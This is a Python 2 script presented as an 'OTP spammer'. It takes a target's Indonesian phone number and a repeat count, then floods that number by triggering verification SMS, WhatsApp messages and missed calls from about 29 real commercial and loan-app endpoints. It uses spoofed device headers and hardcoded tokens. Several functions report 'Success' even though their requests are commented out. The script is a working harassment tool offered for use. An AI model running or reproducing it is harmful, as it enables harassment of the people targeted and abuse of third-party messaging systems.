import requests, json, os, sys, random
#-------------------------------Warna---------------------------------------------------
qu = '\033[0;36m'
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
#--------------------------------Penkodisian-------------------------------------------
def sukses(no1,pro,nam):
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended"%(pu,ku,no1,pu,hi,pu,pu,pro,ku,nam,hi)
def gagal(no1,pro,nam):
  print "     %s[%s%s%s] [%s Failed  %s] %sFailed, spam %s from %s%s %snot sended"%(pu,ku,no1,pu,me,pu,pu,pro,ku,nam,me)
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+62"+nom)
  t = 1
  for spam in range(jum):
   print "%s[%s+%s]-------------------------->>>[%s%s%s]<<<--------------------------[%s+%s]"%(pu,ku,pu,me,t,pu,ku,pu)
   t += 1
   asakita();sunchila();nutriclub();asani();wintershop();datesy();thaifriendly();jumpstart();kinimart();klikwa();bakmikeraton();kopidulukala();kredinesia();pinjamindo();uangpintar();danafix();maucash();omamoriexpress();ktakilat();cairin();kredito();kreditpedia();bocil();duitqu();primacash();temanprima();maripinjam();sobatbangun()
#--------------------------------Banner/LOGO------------------------------------------
def logo():
  print """%s
  __  __ ___    ___                                   
 |  \/  |   \  / __|_ __  __ _ _ __  _ __  ___ _ _ ___ %sAuthor by %sabilseno11%s
 | |\/| | |) | \__ \ '_ \/ _` | '  \| '  \/ -_) '_(_-< %sGithub %sgithub.com/AbilSeno%s
 |_|  |_|___/  |___/ .__/\__,_|_|_|_|_|_|_\___|_| /__/ %sTeam %sanoncybfakeplayers%s
                   |_|                                 %sTools spam otp dengan 29 spammers"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
#-------------------------------Input Function------------------------------------------
def input():
  global nom
  nom = raw_input("%s[%s?%s] %sMasukkan nomor target (8888xx) : "%(pu,me,pu,pu))
  if len(nom) < 5:
    print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
    input()
  elif nom.startswith(tuple(["62","+62","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
    jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,me,pu,pu)))
    main()
#-------------------------------SPAM Function-------------------------------------------
def asakita():
  data={'username':'62'+nom}
  h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
  if 'MOBILE' in h:
   sukses("1","sms","asakita")
  else:
   gagal("1","sms","asakita")
def sunchila():
#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
 # if json.loads(hih.text)["result"] == 'true':
   sukses("2","sms","sunchila")
  #else:
   #gagal("2","sms","sunchila")
def nutriclub():
  h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
   sukses("3","call","nutriclub")
  else:
   gagal("3","call","nutriclub")
def asani():
  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
  if json.loads(j.text)["message"] == 'OTP Terkirim ':
   sukses("4","sms","asani")
  else:
   gagal("4","sms","asani")
def wintershop():
 #dat=json.dumps(["62"+nom,"Winter Shop","",""])
# tes = requests.post("https://api.winter-api.com/account/sendmobilecodeasync.json",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
# if json.loads(tes.text)["message"] == None:
 sukses("5","call","wintershop")
 #else:
  #gagal("5","call","wintershop")
def datesy():
# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
 #if json.loads(to.text)["success"] == True:
  sukses("6","sms","datesy")
 #else:
  #gagal("6","sms","datesy")
def thaifriendly():
 tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
 if json.loads(tes.text)["success"] == True:
  sukses("7","sms","thaifriendly")
 else:
  gagal("7","sms","thaifriendly")
def jumpstart():
 dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
 tes=requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=dat)
 if json.loads(tes.text)["data"] == None:
  gagal("8","sms","jumpstart")
 else:
  sukses("8","sms","jumpstart")
def kinimart():
# tem = requests.post("https://kinimart.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 #if json.loads(tem.text)["IsSuccess"] == True:
  sukses("9","wa","kinimart")
 #else:
 # gagal("9","wa","kinimart")
def klikwa():
 dat=json.dumps({"number":"+62"+nom})
 tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Authorization':'Basic QjMzOkZSMzM='},data=dat)
 if json.loads(tes.text)["message"] == 'OTP Sent':
  print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",pu,hi,pu,pu,"wa",ku,"klikwa",hi,qu,pu,ku)
 else:
  print "     %s[%s%s%s] [%s Failed %s] %sFailed, spam %s from %s%s %snot sended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",pu,me,pu,pu,"wa",ku,"klikwa",me,qu,pu,ku)
def bakmikeraton():
 huh = requests.post("https://www.bakmikeraton.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("11","wa","bakmikeraton")
 else:
  gagal("11","wa","bakmikeraton")
def kopidulukala():
 huh = requests.post("https://kopidulukala.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("12","wa","kopidulukala")
 else:
  gagal("12","wa","kopidulukala")
def kredinesia():
 dat = '{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"%s"}'%nom
 hu = requests.post("https://api.kartuserba.com/appserver/v1/login/verificationCode",headers={'user-agent':'okhttp/3.11.0','content-type':'application/json; charset=UTF-8','channel-key':'GOOGLEPLAY'},data=dat)
 if json.loads(hu.text)["errorCode"] == None:
  sukses("13","sms","kredinesia")
 else:
  gagal("13","sms","kredinesia")
def pinjamindo():
 hu = requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%nom)
 if json.loads(hu.text)["msg"] == 'success':
  sukses("14","sms","pinjamindo")
 else:
  gagal("14","sms","pinjamindo")
def uangpintar():
 hd={
'Host':'www.uangpintar.id:7092',
'Connection':'keep-alive',
'Content-Length':'24',
'deviceId':'bce68810-4f8a-4675-9452-e0d8565c9a50',
'mediaSource':'utm_source=google-play&utm_medium=organic',
'Origin':'http://uangpintar.id:7092',
'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36',
'tropicReferer':'utm_source=google-play&utm_medium=organic',
'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
'Accept':'application/json, text/plain, */*',
'imei':'',
'appName':'UangPintar',
'uuid':'6b743b44-a201-4fa4-b430-840db1eecaf1',
'Referer':'http://uangpintar.id:7092/app/uangpintar.html',
'Accept-Encoding':'gzip, deflate',
'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'X-Requested-With':'com.uf7c21.uangpintar.w465ae'
 }
 pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
 if json.loads(pis.text)["desc"] == 'Success':
  sukses("15","sms","uangpintar")
 else:
  gagal("15","sms","uangpintar")
def danafix():
# dat='{"client_id":"0%s","guid":"dcd0b4e8-c9f7-4fe2-b66b-5e022a14acb8","type":"new","otp_via_zalo":false}'%nom
 #eem = requests.post("https://api.danafix.id/mob/client/verification/send",headers={'user-agent':'okhttp/4.2.0'},data=dat).text
 #if json.loads(eem)["success"] == True:
  sukses("16","sms","danafix")
 #else:
  #gagal("16","sms","danafix")
def maucash():
 hd={
'Host':'japi.maucash.id',
'accept':'application/json, text/plain, */*',
'x-origin':'google play',
'x-org-id':'1',
'x-product-code':'YN-MAUCASH',
'x-app-version':'2.4.23',
'x-source-id':'android',
'accept-encoding':'gzip',
'user-agent':'okhttp/3.12.1'
 }
 hu = requests.get("https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=%s&channelType=0"%nom,headers=hd)
 if json.loads(hu.text)["message"] == 'Permintaan berhasil':
  sukses("17","sms","maucash")
 else:
  gagal("17","sms","maucash")
def omamoriexpress():
 huh = requests.post("https://omamoriexpress.isellershop.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
  sukses("18","wa","omamoriexpress")
 else:
  gagal("18","wa","omamoriexpress")
def ktakilat():
 tu = requests.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code",headers={'user-agent':'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'},data={'mobile_no':nom})
 if json.loads(tu.text)["message"] == 'success':
  sukses("19","sms","ktakilat")
 else:
  gagal("19","sms","ktakilat")
def cairin():
 data={'haveImageCode':'0','fileName':'6f8c3b90c845f09ff1bfe714a30aede8','phone':'0'+nom,'imageCode':'','userImei':'','type':'registry'}
 hua = requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36'},data=data).text
 if json.loads(hua)["code"] == '0':
  sukses("20","sms","cairin")
 else:
  gagal("20","sms","cairin")
def kredito():
 dat='{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%nom
 hd={
'LPR-TIMESTAMP':'1603281035821',
'Accept-Language':'id-ID',
'LPR-BRAND':'Kredito',
'LPR-PLATFORM':'android',
'User-Agent':'okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android',
'Authorization':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks',
'LPR-SIGNATURE':'e15dbea8602409df32a2ed5a123dc244',
'Content-Type':'application/json; charset=UTF-8',
'Content-Length':'79'
 }
 hy=requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",headers=hd,data=dat).text
 if json.loads(hy)["msg"] == 'sukses':
  sukses("21","sms","kredito")
 else:
  gagal("21","sms","kredito")
def kreditpedia():
 hd={
'Host':'www.kreditpedia.co.id:8089',
'Connection':'keep-alive',
'Content-Length':'24',
'deviceId':'bce68810-4f8a-4675-9452-e0d8565c9a50',
'mediaSource':'',
'Origin':'https://kreditpedia.co.id',
'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36',
'tropicReferer':'utm_source=google-play&utm_medium=organic',
'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
'Accept':'application/json, text/plain, */*',
'imei':'',
'appName':'Kreditpedia',
'uuid':'5afe4084-6f32-4647-8dcc-2b7bfdb85148',
'Referer':'https://kreditpedia.co.id/app/',
'Accept-Encoding':'gzip, deflate',
'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'X-Requested-With':'com.ecreditpal.tropic2'
 }
 hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
 if json.loads(hu.text)["desc"] == 'Success':
  sukses("22","sms","kreditpedia")
 else:
  gagal("22","sms","kreditpedia")
def bocil():
 dat={'user_id':'','language':'in','phone':'62'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
 uh = requests.post("https://bocil.id/mobile/v1/miscallotp_request.php",headers={'user-agent':'okhttp/3.10.0'},data=dat).text
 if json.loads(uh)["message"] == 'ok':
  sukses("23","call","bocil")
 else:
  gagal("23","call","bocil")
def duitqu():
 tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
 sukses("24","sms","duiqu")
def primacash():
# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
# if json.loads(uhu)["success"] == True:
  sukses("25","sms","primacash")
 #else:
  #gagal("26","sms","primacash")
def temanprima():
 dat=json.dumps({"phone":"62"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
 hpo = requests.post("https://pro.temanprima.co.id/teman_prima/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=dat).text
 if json.loads(hpo)["success"] == True:
  sukses("28","sms","temanprima")
 else:
  gagal("28","sms","temanprima")
def maripinjam():
 hd={
'Host':'api.guntur.top',
'Connection':'Keep-Alive',
'Accept-Encoding':'gzip',
'User-Agent':'okhttp/3.8.0',
'pm-osType':'3',
'pm-osversion':'28',
'pm-osdevice':'bce68810-4f8a-4675-9452-e0d8565c9a50',
'pm-clientId':'-1',
'Accept-Language':'in-ID',
'Connection':'close',
'pm-appversion':'V1.2.4',
'vest':'521',
'packageName':'com.inacashkangaroo.app',
'phoneModel':'vivo 1902'
 }
 ijo=requests.get("https://api.guntur.top/a0jm6akw/hvfgpv71/wzq12mqh/"+nom+"/2",headers=hd).text
 if json.loads(ijo)["success"] == True:
  sukses("29","sms","maripinjam")
 else:
  gagal("29","sms","maripinjam")
def sobatbangun():
# h = json.loads(requests.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=0%s"%nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
 #if h["status"] == 'success':
  sukses("30","wa","sobatbangun")
 #else:
  #gagal("30","wa","sobatbangun")


if __name__ == '__main__':
 try:
  os.system("clear")
  logo()
  input()
 except (KeyboardInterrupt,EOFError): print "%s[%s!%s] %sExit"%(pu,me,pu,pu)
 except requests.exceptions.ConnectionError: exit("%s[%s!%s] %sConnection Error..."%(pu,me,pu,me))
